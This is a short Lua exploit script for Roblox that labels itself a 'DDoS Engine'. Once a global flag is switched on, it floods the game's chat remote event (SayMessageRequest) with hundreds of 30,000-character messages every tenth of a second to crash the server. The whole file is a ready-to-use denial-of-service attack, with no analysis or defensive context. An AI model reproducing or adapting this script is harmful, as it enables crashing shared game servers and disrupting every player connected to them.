_G.MasterCrash = false
task.spawn(function()
    while true do
        if _G.MasterCrash then
            for i = 1, 600 do
                local r = game:GetService("ReplicatedStorage"):FindFirstChild("SayMessageRequest", true)
                if r then r:FireServer(string.rep("▓", 30000), "All") end
            end
        end
        task.wait(0.1)
    end
end)
print("[3] DDoS Engine Ready")
